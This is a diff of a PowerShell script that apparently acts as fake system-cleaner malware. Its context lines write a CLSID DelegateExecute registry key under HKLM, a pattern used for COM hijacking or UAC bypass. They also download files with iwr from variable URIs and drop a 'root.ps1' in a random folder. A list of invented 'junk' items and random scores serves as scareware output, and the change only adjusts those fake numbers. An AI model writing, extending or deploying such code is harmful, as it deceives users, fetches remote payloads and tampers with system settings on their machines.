@@ -21,8 +21,8 @@ $basePath = "HKLM:\Software\Classes\CLSID\$g\Shell\Open\Command\DelegateExecute\
 New-Item -Path "$basePath" -Force
 New-ItemProperty -Path "$basePath" -Name "mode" -PropertyType DWORD -Value 0xFFFFFFFF -Force | Out-Null
 $ms = @("WinSxS_Backup", "System32_Compat", "TrustedInstallerCache", "Edge_Telemetry", "DirectX_Logs", "Windows_Defender_CrashDumps", "ServiceHost_Spooler", "RDP_Encryption_Junk", "NVIDIA_Driver_Dumpster", "UpdateOrchestrator_Failures", "LSA_Secret_Trash", "WMI_Execution_Garbage", "TaskScheduler_Fuckups", "MSI_Installer_Leftovers", "EventLog_Bloatware", "PowerShell_Module_Clutter", "NetFramework_BrokenAssemblies", "BITS_Transfer_Corruption", "CredentialManager_Leaks", "Firewall_Rule_Chaos" ) 
-$p = Get-Random -Count $ms.Length -In (1..2369)
-$score = Get-Random -Minimum 384 -Maximum 2023
+$p = Get-Random -Count $ms.Length -In (1..100)
+$score = Get-Random -Minimum 1 -Maximum 100
 $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $rootPath = "$rootPath\root.ps1"
 iwr -Uri $initServiceRootmonmonUri -OutFile $initServiceRootmonmonPath
@@ -32,7 +32,7 @@ iwr -Uri $initFinde -OutFile $initFindePath
 
 
 
-1..2370 | ForEach-Object {
+1..101 | ForEach-Object {
     $curr = $_
     if($p.Contains($curr)){
         $idx = 0..($p.Count - 1) | Where-Object { $p[$_] -eq $curr }
